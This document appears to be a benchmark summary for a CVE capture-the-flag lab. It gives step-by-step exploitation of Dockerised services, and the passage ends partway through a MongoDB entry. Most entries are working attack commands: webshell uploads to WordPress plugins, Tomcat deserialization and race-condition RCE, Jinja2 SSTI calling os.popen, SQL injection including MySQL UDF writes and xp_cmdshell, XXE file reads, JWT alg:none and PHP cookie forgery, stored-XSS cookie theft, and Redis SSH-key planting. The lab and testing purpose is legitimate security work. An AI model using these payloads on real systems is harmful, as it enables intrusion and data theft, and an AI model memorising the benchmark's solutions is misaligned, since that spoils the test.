# CVE Benchmark 利用说明总览（BENCHMARK_SUMMARY）

> **范围**：仅包含当前环境可部署、可端到端测试的场景与攻击链（Docker / KIND）。
> **源目录**：[cve_challenges/docs/](cve_challenges/docs/)
> **生成**：运行 `python cve_challenges/scripts/build_benchmark_summary.py` 可复现。
## 目录

- [一、单点场景](#一单点场景)
  - [1.1 Docker：Web / 数据库 / Cloud](#11-dockerweb--数据库--cloud)
  - [1.2 Kubernetes 单点场景](#12-kubernetes-单点场景)
- [二、攻击链场景（29）](#chains-section)
  - [container-to-admin](#chain-container-to-admin)
  - [caps-to-cluster](#chain-caps-to-cluster)
  - [cri-to-etcd](#chain-cri-to-etcd)
  - [docker-to-etcd](#chain-docker-to-etcd)
  - [externalip-to-secrets](#chain-externalip-to-secrets)
  - [hostpath-to-daemonset](#chain-hostpath-to-daemonset)
  - [ingress-to-etcd](#chain-ingress-to-etcd)
  - [kubelet-to-etcd](#chain-kubelet-to-etcd)
  - [privilege-to-etcd](#chain-privilege-to-etcd)
  - [sa-lateral-escape](#chain-sa-lateral-escape)
  - [seccomp-to-escape](#chain-seccomp-to-escape)
  - [ssrf-to-cross-account](#chain-ssrf-to-cross-account)
  - [lambda-to-cross-account](#chain-lambda-to-cross-account)
  - [ci-to-oidc](#chain-ci-to-oidc)
  - [db-to-cross-account](#chain-db-to-cross-account)
  - [s3-to-cf](#chain-s3-to-cf)
  - [gateway-to-deputy](#chain-gateway-to-deputy)
  - [notebook-to-scp](#chain-notebook-to-scp)
  - [ssrf-to-oidc](#chain-ssrf-to-oidc)
  - [db-to-passrole](#chain-db-to-passrole)
  - [cf-to-scp](#chain-cf-to-scp)
  - [loggap-to-s3-stealth](#chain-loggap-to-s3-stealth)
  - [svctag-to-imds-to-deputy](#chain-svctag-to-imds-to-deputy)
  - [web-to-db-to-cross-account](#chain-web-to-db-to-cross-account)
  - [xxe-to-es](#chain-xxe-to-es)
  - [php-to-mongo](#chain-php-to-mongo)
  - [redis-to-k8s](#chain-redis-to-k8s)
  - [wp-lfi-to-cluster](#chain-wp-lfi-to-cluster)
  - [pg-sqli-to-node](#chain-pg-sqli-to-node)
- [附录 A：可部署场景注册表](#附录-a可部署场景注册表)
- [附录 B：源文件索引](#附录-b源文件索引)

## 一、单点场景

### 1.1 Docker：Web / 数据库 / Cloud

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-03: WordPress Simple File List RCE (CVE-2025-34085)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-34085 (CVSS 10.0) |
| Difficulty | L1 |
| Port | 10103 |
| Plugin | simple-file-list 4.2.2 |

#### Attack Path
```
Unauthenticated file upload → PHP webshell → RCE → /flag.txt
```

#### Step-by-Step

```bash
## Upload PHP file via plugin's unauthenticated endpoint
curl -X POST http://localhost:10103/wp-content/plugins/simple-file-list/ee-upload-engine.php \
  -F "file=@shell.php"

## Access uploaded shell
curl "http://localhost:10103/wp-content/uploads/simple-file-list/shell.php?c=cat+/flag.txt"
## flag{web-03-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-04: WordPress WPBookit RCE (CVE-2025-6058)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-6058 (CVSS 9.8) |
| Difficulty | L1 |
| Port | 10104 |
| Plugin | wpbookit 1.0.4 |

#### Attack Path
```
Unauthenticated POST to image_upload_handle() → PHP file upload → RCE → /flag.txt
```

#### Step-by-Step

```bash
## Exploit image_upload_handle() unauthenticated upload
curl -X POST "http://localhost:10104/wp-admin/admin-ajax.php?action=image_upload_handle" \
  -F "file=@exploit.php"

## Access webshell
curl "http://localhost:10104/wp-content/uploads/wpbookit/exploit.php?cmd=cat%20/flag.txt"
## flag{web-04-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-01: Apache Tomcat Deserialization RCE (CVE-2025-24813)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-24813 (CVSS 9.8) |
| Difficulty | L2 |
| Port | 10101 |
| Path | docker/web/tomcat-deserialization |
| Image | tomcat:9.0.98-jdk11 |

#### Attack Path
```
PUT partial session file → Deserialization via PersistentManager FileStore → RCE → read /opt/flag.txt
```

#### Step-by-Step

```bash
## Probe: Tomcat 9.0.98 with read-only disabled
curl -s http://localhost:10101/ | grep -i tomcat

## Exploit: PUT serialized payload via partial PUT
## Using ysoserial or custom Java deserialization gadget
## commons-collections-3.2.1.jar is available

## Send payload
curl -X PUT http://localhost:10101/session -H "Content-Range: bytes 0-1000/1001" \
  --data-binary @payload.ser

## Trigger deserialization by accessing session
curl http://localhost:10101/ -H "Cookie: JSESSIONID=.XXXXX"

## Read flag
curl http://localhost:10101/cmd?c=cat+/opt/flag.txt
## flag{web-01-xxxxxxxxxxxxxxxx}
```

#### Flag Location
- `/opt/flag.txt` inside Tomcat container
- Requires RCE through deserialization

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-02: Apache Tomcat Race Condition RCE (CVE-2024-50379)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2024-50379 |
| Difficulty | L2 |
| Port | 10102 |
| Image | tomcat:9.0.97-jdk11 |

#### Attack Path
```
PUT .jsp file → Race condition: JSP compilation before PUT validation → RCE → /opt/flag.txt
```

#### Step-by-Step

```bash
## Upload JSP webshell with concurrent requests (race condition exploit)
for i in $(seq 1 100); do
  curl -X PUT "http://localhost:10102/shell.jsp" -d '<% Runtime.getRuntime().exec("cat /opt/flag.txt") %>' &
  curl "http://localhost:10102/shell.jsp" &
done
wait

## Flag: flag{web-02-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-12: SSTI Jinja2 Template Injection

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSTI (Server-Side Template Injection) |
| Difficulty | L2 |
| Port | 10112 |
| Path | docker/web/ssti-jinja2/ |
| Type | docker |
| Service | Shipping Request Form |

#### Attack Path Summary
```
User submits form → name parameter injected into Jinja2 Template() constructor → SSTI → RCE → Read flag
```

#### Prerequisites

##### Knowledge
- Jinja2模板引擎SSTI (Jinja2 template engine SSTI): Understanding how Jinja2 evaluates template expressions during rendering
- Python MRO (Method Resolution Order): Traversing Python class hierarchies for object exploitation
- 沙箱逃逸 (Sandbox escape): Techniques to break out of restricted Python execution environments

##### Tools
- curl: Send HTTP POST requests with crafted SSTI payloads
- Python3: Test and construct RCE payloads for verification

#### Step-by-Step Exploitation

##### Step 1: Access the Shipping Request Form

Open the service in a browser or via curl to view the form.

```bash
curl http://localhost:10112/
```

##### Step 2: Test SSTI Detection

Submit a mathematical expression wrapped in Jinja2 template syntax to confirm SSTI vulnerability.

```bash
curl -X POST http://localhost:10112/submit -d "name={{7*7}}"
```

Expected response contains "Thank you 49" — the expression `7*7` was evaluated server-side to `49`.

##### Step 3: Enumerate Available Classes

List all available Python subclasses to identify exploitable objects for RCE.

```bash
curl -X POST http://localhost:10112/submit -d "name={{''.__class__.__mro__[1].__subclasses__()}}"
```

##### Step 4: Execute RCE to Read the Flag

Use `lipsum` (a globally available Jinja2 object) to access `os.popen` and read the flag file.

```bash
curl -X POST http://localhost:10112/submit -d "name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}"
```

#### Flag Location
- `/FLAG.txt` in the application container

#### Verification Commands
```bash
curl -s -X POST http://localhost:10112/submit -d "name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}" | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-07: PostgreSQL Encoding Bypass SQLi (CVE-2025-1094)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-1094 |
| Difficulty | L2 |
| Port | 10107 |
| DB | PostgreSQL 16.6 |
| Encoding | PGCLIENTENCODING=BIG5 |

#### Attack Path
```
BIG5 encoding mismatch → SQL injection in search → UNION SELECT → Read flag_holder table → flag
```

#### Step-by-Step

```bash
## Step 1: Identify SQLi via encoding confusion
## The app uses: SELECT name, price FROM products WHERE name LIKE '%{keyword}%'
## BIG5 multibyte characters can break out of LIKE string

## Step 2: UNION-based extraction
curl "http://localhost:10107/search?q=%a5%27+UNION+SELECT+flag,1+FROM+flag_holder--"

## Step 3: Read flag
## flag{web-07-xxxxxxxxxxxxxxxx}
```

#### Flag Location
- In PostgreSQL table `flag_holder`, column `flag`
- Database: postgres, table created by init.sql

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-08: MySQL UDF Privilege Escalation via SQLi

#### Overview
| Property | Value |
|----------|-------|
| Technique | MySQL UDF Abuse |
| Difficulty | L3 |
| Port | 10108 |
| DB | MySQL 8.0.35 (--secure-file-priv="") |

#### Attack Path
```
SQLi in ?id= → Write UDF library to plugin_dir → CREATE FUNCTION sys_exec → RCE → /flag.txt
```

#### Step-by-Step

```bash
## Step 1: Identify SQLi: SELECT ... WHERE id = $id
curl "http://localhost:10108/product.php?id=1'"

## Step 2: Check MySQL variables
curl "http://localhost:10108/product.php?id=1'+UNION+SELECT+@@plugin_dir,@@secure_file_priv--"

## Step 3: Write UDF library via INTO DUMPFILE
curl "http://localhost:10108/product.php?id=1'+UNION+SELECT+0x<UDF_HEX>,NULL+INTO+DUMPFILE+'/usr/lib/mysql/plugin/udf.so'--"

## Step 4: Create function and execute
curl "http://localhost:10108/product.php?id=1';CREATE+FUNCTION+sys_exec+RETURNS+STRING+SONAME+'udf.so';--"
curl "http://localhost:10108/product.php?id=1';SELECT+sys_exec('cat+/flag.txt');--"
## flag{web-08-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-09: MSSQL xp_cmdshell Command Execution

#### Overview
| Property | Value |
|----------|-------|
| Technique | MSSQL xp_cmdshell |
| Difficulty | L2 |
| Web Port | 10109 |
| DB Port | 10119 |
| DB | MSSQL Server 2022 |
| SA Password | Password123! |

#### Attack Path
```
SQLi in ASP.NET app → Enable xp_cmdshell → Execute OS commands → /flag.txt
```

#### Step-by-Step

```bash
## Step 1: SQL injection in ASP.NET application
curl "http://localhost:10109/search?q=test'+OR+1=1--"

## Step 2: Enable xp_cmdshell via SQLi
curl "http://localhost:10109/search?q=';EXEC+sp_configure+'show+advanced+options',1;RECONFIGURE;--"
curl "http://localhost:10109/search?q=';EXEC+sp_configure+'xp_cmdshell',1;RECONFIGURE;--"

## Step 3: Execute command to read flag
curl "http://localhost:10109/search?q=';EXEC+xp_cmdshell+'type+C:\flag.txt';--"
## flag{web-09-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-06: PHP LFI to RCE via Jupiter X Core (CVE-2025-0366)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-0366 (CVSS 8.8) |
| Difficulty | L2 |
| Port | 10106 |
| Entry | contributor / Password123! |

#### Attack Path
```
Login as Contributor → Upload malicious SVG with PHP → LFI to include SVG → RCE → /flag.txt
```

#### Step-by-Step

```bash
## Step 1: Login as contributor
curl -c cookies.txt -X POST http://localhost:10106/wp-login.php \
  -d "log=contributor&pwd=Password123!"

## Step 2: Upload SVG with embedded PHP via Jupiter X Core
curl -b cookies.txt http://localhost:10106/wp-admin/admin-ajax.php \
  -F "action=jupiterx_upload" -F "file=@payload.svg"

## Step 3: Trigger LFI to include uploaded SVG
curl "http://localhost:10106/?file=../../../../wp-content/uploads/jupiterx/payload.svg&c=cat+/flag.txt"
## flag{web-06-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-10: SSRF Internal Service Access

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSRF (Server-Side Request Forgery) |
| Difficulty | L1 |
| Port | 10110 |
| Path | docker/web/ssrf-internal/ |
| Type | docker |
| Service | URL Preview Service (public) + Internal Flag Service (private) |

#### Attack Path Summary
```
User submits internal URL → Server fetches without validation → SSRF to internal service → Flag returned
```

#### Prerequisites

##### Knowledge
- SSRF原理 (SSRF principles): Understanding how SSRF attacks work to access internal resources
- Docker内部网络通信 (Docker internal network communication): Knowledge of Docker container networking and internal hostname resolution
- HTTP GET请求构造 (HTTP GET request construction): Crafting HTTP requests with query parameters

##### Tools
- curl: Send HTTP requests and test SSRF against internal services
- Burp Suite: Intercept, modify, and replay HTTP requests

#### Step-by-Step Exploitation

##### Step 1: Access the URL Preview Service

Open the target service to confirm it is running and understand its functionality.

```bash
curl http://localhost:10110/
```

##### Step 2: Test Normal URL Fetch

Submit a legitimate external URL to verify the fetch functionality works as expected.

```bash
curl "http://localhost:10110/fetch?url=http://example.com"
```

##### Step 3: Discover Internal Service by Probing

Probe common internal hostnames and ports to discover services within the Docker network.

```bash
curl "http://localhost:10110/fetch?url=http://internal:5000/"
```

##### Step 4: Directly Access the Flag

Once the internal service is discovered, request the flag endpoint directly via the SSRF vector.

```bash
curl "http://localhost:10110/fetch?url=http://internal:5000/flag"
```

The flag is returned in the response body.

#### Flag Location
- `/flag.txt` inside the internal container, accessible only via SSRF through the URL Preview Service

#### Verification Commands
```bash
curl -s "http://localhost:10110/fetch?url=http://internal:5000/flag" | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-11: SSRF Localhost Auth Bypass

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSRF Localhost Bypass |
| Difficulty | L2 |
| Port | 10111 |
| Path | docker/web/ssrf-localhost-bypass/ |
| Type | docker |
| Service | Markdown to HTML Converter |

#### Attack Path Summary
```
User-supplied URL fetched by server → SSRF → Bypass localhost IP check → Admin endpoint → Flag
```

#### Prerequisites

##### Knowledge
- SSRF localhost bypass techniques: Methods to bypass IP-based access controls (127.0.0.1, localhost, 0.0.0.0)
- IP-based access control circumvention: Understanding how applications restrict access based on source IP
- urllib SSRF vulnerabilities: Python urllib library behavior with redirects and internal addresses
- HTTP协议 (HTTP protocol): HTTP request structure, methods, and status codes

##### Tools
- curl: Send HTTP requests to exploit the SSRF vulnerability
- netcat: Network debugging and port testing

#### Step-by-Step Exploitation

##### Step 1: Access the Markdown Converter Service

Open the service and observe the URL fetch functionality presented to users.

```bash
curl http://localhost:10111/
```

##### Step 2: Attempt Direct Admin Access

Try to access the admin endpoint directly to confirm it is blocked from external access.

```bash
curl http://localhost:10111/admin
```

##### Step 3: Use Fetch Endpoint to Request Localhost Admin

Leverage the fetch functionality to bypass IP restrictions by making the server request itself on localhost.

```bash
curl "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin"
```

##### Step 4: Retrieve the Flag via SSRF

Access the admin flag endpoint through the SSRF vulnerability to read the flag.

```bash
curl "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin/flag"
```

The flag is displayed on the admin page response.

#### Flag Location
- `/flag.txt`, displayed on the admin page when accessed via SSRF from localhost

#### Verification Commands
```bash
curl -s "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin/flag" | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-13: XXE XML External Entity

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | XXE (XML External Entity) |
| Difficulty | L1 |
| Port | 10113 |
| Path | docker/web/xxe-library/ |
| Type | docker |
| Service | Library Book Import Service |

#### Attack Path Summary
```
User sends XML → lxml parser with resolve_entities=True → XXE via external entity → File read
```

#### Prerequisites

##### Knowledge
- XML/DTD语法 (XML/DTD syntax): Understanding XML document structure and Document Type Definitions
- External Entity声明 (External Entity declaration): How DOCTYPE and ENTITY declarations work in XML
- 带内XXE (in-band XXE): XXE attacks where data is returned directly in the HTTP response

##### Tools
- curl: Send crafted XML payloads via HTTP POST requests
- Burp Suite: Repeater for testing and modifying XML payloads interactively

#### Step-by-Step Exploitation

##### Step 1: Access the Library Service

Open the service and observe the XML book import functionality.

```bash
curl http://localhost:10113/
```

##### Step 2: Send Normal Book XML

Test the service with a standard XML payload to confirm it accepts and processes XML input correctly.

```bash
curl -X POST http://localhost:10113/addbook -d '<book><title>Test</title></book>'
```

##### Step 3: Craft XXE Payload

Inject a DOCTYPE declaration with an external entity that reads the flag file and includes its contents in the response.

```bash
curl -X POST http://localhost:10113/addbook -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book><title>&xxe;</title></book>'
```

##### Step 4: Retrieve the Flag

The flag file content is substituted in place of the `&xxe;` entity reference and returned in the HTTP response.

#### Flag Location
- `/flag.txt` on the server filesystem

#### Verification Commands
```bash
curl -s -X POST http://localhost:10113/addbook -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book><title>&xxe;</title></book>' | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-14: XXE SVG Upload

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | XXE via SVG |
| Difficulty | L2 |
| Port | 10114 |
| Path | docker/web/xxe-svg/ |
| Type | docker |
| Service | Profile Avatar Upload Service |

#### Attack Path Summary
```
Upload SVG avatar → SVG parsed with resolve_entities=True → XXE → File read
```

#### Prerequisites

##### Knowledge
- SVG文件格式 (SVG file format): Understanding SVG XML structure and common elements
- SVG内嵌XXE (XXE embedded in SVG): How to embed XXE payloads within SVG XML files
- multipart文件上传 (Multipart file upload): HTTP multipart/form-data upload mechanism

##### Tools
- curl: Upload files using multipart/form-data requests
- Python3: Create the SVG payload file programmatically

#### Step-by-Step Exploitation

##### Step 1: Access the Upload Form

Open the avatar upload service to view the upload interface.

```bash
curl http://localhost:10114/
```

##### Step 2: Create Malicious SVG with XXE Payload

Create an SVG file containing an XXE payload that reads the flag file.

```bash
cat > payload.svg << 'EOF'
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

##### Step 3: Upload the Malicious SVG

Submit the SVG file via the avatar upload endpoint.

```bash
curl -X POST http://localhost:10114/upload -F "file=@payload.svg"
```

##### Step 4: Flag Extraction

The server parses the SVG XML and substitutes the `&xxe;` entity with the flag file content in the response output.

#### Flag Location
- `/app/flag.txt` in the application container

#### Verification Commands
```bash
curl -s -X POST http://localhost:10114/upload -F "file=@payload.svg" | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-05: WordPress Copypress JWT RCE (CVE-2025-8625)

#### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-8625 (CVSS 9.8) |
| Difficulty | L2 |
| Port | 10105 |
| Plugin | copypress-rest-api 1.2 |

#### Attack Path
```
Discover hardcoded JWT secret → Forge admin JWT → Upload malicious plugin via REST API → RCE → /flag.txt
```

#### Step-by-Step

```bash
## Step 1: Discover hardcoded JWT secret (in plugin source)
curl http://localhost:10105/wp-content/plugins/copypress-rest-api/copypress.php | grep -i secret

## Step 2: Forge JWT token with admin role
## Use jwt.io or Python PyJWT with discovered secret

## Step 3: Upload PHP shell via REST API
curl -X POST http://localhost:10105/wp-json/copypress/v1/upload \
  -H "Authorization: Bearer <forged_admin_jwt>" \
  -F "file=@shell.php"

## Read flag
curl http://localhost:10105/wp-content/uploads/copypress/shell.php?cmd=cat+/flag.txt
## flag{web-05-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-15: JWT Algorithm None Attack

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | JWT Algorithm Confusion (alg:none) |
| Difficulty | L2 |
| Port | 10115 |
| Path | docker/web/jwt-none-algorithm/ |
| Type | docker |
| Service | Company Employee Portal |

#### Attack Path Summary
```
Login as guest → Get JWT token → Forge JWT with alg:none + admin role → Access admin endpoint → Flag
```

#### Prerequisites

##### Knowledge
- JWT结构 (JWT structure): Understanding the header.payload.signature format
- alg:none攻击 (alg:none attack): Exploiting JWT libraries that accept the "none" algorithm for authentication bypass
- Base64编码 (Base64 encoding): Encoding and decoding JWT payload segments
- token伪造 (Token forgery): Crafting manipulated JWT tokens with altered claims

##### Tools
- curl: Send HTTP requests for login and admin access
- Python3 PyJWT: Programmatically forge JWT tokens with algorithm manipulation
- jwt.io: Online JWT debugger for decoding and crafting tokens

#### Step-by-Step Exploitation

##### Step 1: Access the Employee Portal

Open the portal and explore the available endpoints.

```bash
curl http://localhost:10115/
```

##### Step 2: Login as Guest

Obtain a legitimate JWT token by authenticating with guest credentials.

```bash
curl -X POST http://localhost:10115/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest123"}'
```

##### Step 3: Decode the Token

Base64-decode the payload segment to understand the token structure and claim names.

```bash
## Decode the JWT payload (second dot-separated segment)
echo "<payload_segment>" | base64 -d 2>/dev/null
```

Expected structure: `{"username":"guest","role":"user"}`

##### Step 4: Forge an Admin Token

Create a new JWT with `alg: none` (no signature) and admin-level claims.

```bash
python3 -c "
import jwt
token = jwt.encode({'username':'admin','role':'admin'}, '', algorithm='none')
print(token)
"
```

##### Step 5: Access the Admin Endpoint

Use the forged token to access the admin dashboard.

```bash
curl http://localhost:10115/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

The flag is returned in the admin dashboard response.

#### Flag Location
- Set as the `FLAG` environment variable in the container

#### Verification Commands
```bash
python3 -c "
import jwt, requests
token = jwt.encode({'username':'admin','role':'admin'}, '', algorithm='none')
r = requests.get('http://localhost:10115/admin', headers={'Authorization': f'Bearer {token}'})
print(r.text)
" | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-17: PHP Deserialization Auth Bypass

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | PHP Deserialization |
| Difficulty | L2 |
| Port | 10117 |
| Path | docker/web/php-deserialization/ |
| Type | docker |
| Service | Secure Notes App (PHP) |

#### Attack Path Summary
```
Login as guest → Analyze serialized cookie → Forge admin cookie → Bypass authentication → Flag
```

#### Prerequisites

##### Knowledge
- PHP序列化格式 (PHP serialization format): Understanding `O:classname:propcount:{...}` serialized object structure
- Base64编码 (Base64 encoding): Encoding and decoding cookie values for manipulation
- 对象属性操纵 (Object property manipulation): Modifying serialized object properties to change user roles

##### Tools
- curl: Send HTTP requests with cookie manipulation
- PHP CLI: Generate serialized PHP objects locally using PHP
- Burp Suite Decoder: Decode and modify base64-encoded cookies interactively

#### Step-by-Step Exploitation

##### Step 1: Access the Login Page

Open the Secure Notes App login page.

```bash
curl http://localhost:10117/
```

##### Step 2: Login as Guest

Authenticate with guest credentials and capture the session cookie.

```bash
curl -c cookies.txt -X POST http://localhost:10117/login.php \
  -d "username=guest&password=guest123"
```

##### Step 3: Decode the Cookie

Read the cookie from the cookie jar and decode it to view the serialized PHP User object.

```bash
## Read the cookie value
COOKIE=$(grep creds cookies.txt | awk '{print $NF}')
echo "$COOKIE"
## Decode from base64
echo "$COOKIE" | base64 -d
```

Expected output: `O:4:"User":2:{s:8:"username";s:5:"guest";s:8:"is_admin";b:0;}`

##### Step 4: Forge an Admin Cookie

Modify the serialized object to set `is_admin` to `true` and `username` to `admin`, then base64-encode the result.

```bash
FORGED=$(echo 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}' | base64 -w0)
echo "$FORGED"
```

##### Step 5: Access the Application with Forged Cookie

Use the forged cookie to access the application as an admin user.

```bash
curl -b "creds=$FORGED" http://localhost:10117/
```

The flag is displayed in the response when `is_admin` evaluates to `true`.

#### Flag Location
- In `index.php`, displayed when the deserialized User object has `is_admin == true`

#### Verification Commands
```bash
FORGED=$(echo 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}' | base64 -w0)
curl -s -b "creds=$FORGED" http://localhost:10117/ | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-16: GraphQL Introspection + IDOR

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | GraphQL Introspection + IDOR |
| Difficulty | L2 |
| Port | 10116 |
| Path | docker/web/graphql-idor/ |
| Type | docker |
| Service | Medical Prescription Portal |

#### Attack Path Summary
```
Access GraphiQL → Introspection query → Discover get_prescriptions(user_id) → IDOR query admin's prescriptions → Flag
```

#### Prerequisites

##### Knowledge
- GraphQL schema introspection: Querying GraphQL schemas to discover types, fields, and arguments
- GraphQL查询语法 (GraphQL query syntax): Writing structured GraphQL queries to request specific data
- IDOR原理 (IDOR principles): Understanding Insecure Direct Object Reference vulnerabilities where user IDs are not validated

##### Tools
- curl: Send GraphQL queries via command line
- GraphiQL (browser): Interactive GraphQL IDE available at the /graphql endpoint
- Altair GraphQL Client: Feature-rich GraphQL client for schema exploration

#### Step-by-Step Exploitation

##### Step 1: Access the GraphiQL Interface

Open the GraphQL endpoint to confirm the service is running.

```bash
curl http://localhost:10116/graphql
```

##### Step 2: Run Introspection Query

Discover all available types, queries, mutations, and their arguments by executing an introspection query.

```bash
curl -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}'
```

##### Step 3: Identify the Vulnerable Query

From the introspection results, find the `getPrescriptions(userId: Int)` query that allows specifying a user ID.

##### Step 4: Exploit IDOR to Access Admin Prescriptions

Query prescriptions for user_id=1 (admin) without proper authorization checks.

```bash
curl -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ getPrescriptions(userId: 1) { id medication instructions } }"}'
```

The flag is contained in the first prescription's instructions field.

#### Flag Location
- Stored as admin's prescription in the SQLite database, accessible through IDOR

#### Verification Commands
```bash
curl -s -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ getPrescriptions(userId: 1) { id medication instructions } }"}' \
  | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### WEB-18: Stored XSS Session Theft

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | Stored XSS (Cross-Site Scripting) |
| Difficulty | L1 |
| Port | 10118 |
| Path | docker/web/stored-xss/ |
| Type | docker |
| Service | Community Message Board |

#### Attack Path Summary
```
Post XSS payload → Admin bot visits → Cookie stolen → Use stolen cookie → Access admin → Flag
```

#### Prerequisites

##### Knowledge
- XSS类型 (XSS types): Understanding stored (persistent) cross-site scripting vs reflected and DOM-based
- Cookie/Session机制 (Cookie/session mechanism): How session tokens are stored and transmitted in HTTP headers
- XSS payload绕过 (XSS payload bypass): Crafting payloads that evade input filters
- eval/script注入 (eval/script injection): Using script tags and JavaScript execution for cookie exfiltration

##### Tools
- curl: Post messages and retrieve stolen cookies via HTTP requests
- Burp Suite: Intercept and modify requests for testing
- Browser: View the application UI and observe admin bot behavior

#### Step-by-Step Exploitation

##### Step 1: Access the Message Board

Open the community message board.

```bash
curl http://localhost:10118/
```

##### Step 2: Observe Admin Bot Behavior

Note that the home page mentions an admin bot visits every 30 seconds to review new messages.

##### Step 3: Post an XSS Payload

Submit a message containing a JavaScript payload that exfiltrates cookies to a collector endpoint.

```bash
curl -X POST http://localhost:10118/post \
  -d 'name=hacker&message=<script>document.location="/steal?c="+document.cookie</script>'
```

##### Step 4: Wait for Admin Bot and Retrieve Stolen Cookies

Wait up to 30 seconds for the admin bot to visit the page, then check the stolen cookies endpoint.

```bash
curl http://localhost:10118/view_stolen
```

The admin token is in the format `admin_token=flag{...}`.

##### Step 5: Use Stolen Admin Cookie

Access the admin dashboard using the stolen cookie value.

```bash
curl -b "admin_token=<FLAG_VALUE>" http://localhost:10118/admin
```

##### Step 6: Flag Confirmation

The flag is displayed in the admin dashboard. The `admin_token` cookie value itself IS the flag (self-verifying).

#### Flag Location
- The `admin_token` cookie value IS the flag (self-verifying)
- Also displayed on the admin dashboard page

#### Verification Commands
```bash
## Post XSS payload
curl -s -X POST http://localhost:10118/post \
  -d 'name=hacker&message=<script>document.location="/steal?c="+document.cookie</script>'
## Wait ~30s for admin bot, then check stolen cookies
curl -s http://localhost:10118/view_stolen | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-05: Redis Unauthorized Access

| Property | Value |
|----------|-------|
| Technique | Redis RCE via SSH key |
| Difficulty | L1 |
| Redis Port | 10205 |
| SSH Port | 10222 |
| User | victim / password123 |

#### Attack Path
```
Connect to Redis (no auth) → Write SSH key to ~/.ssh/authorized_keys → SSH as victim → /flag.txt
```

```bash
## Step 1: Generate SSH key pair on attacker
ssh-keygen -t rsa -f redis_key -N ""

## Step 2: Write public key to Redis
redis-cli -h localhost -p 10205
CONFIG SET dir /home/victim/.ssh
CONFIG SET dbfilename authorized_keys
SET key "$(cat redis_key.pub | tr -d '\n')"
SAVE

## Step 3: SSH as victim
ssh -i redis_key -p 10222 victim@localhost
cat /flag.txt
## flag{db-05-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-06: MongoDB Unauthorized Access

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Default Configuration Weakness) |
| Difficulty | L1 |
| Port | 10206 |
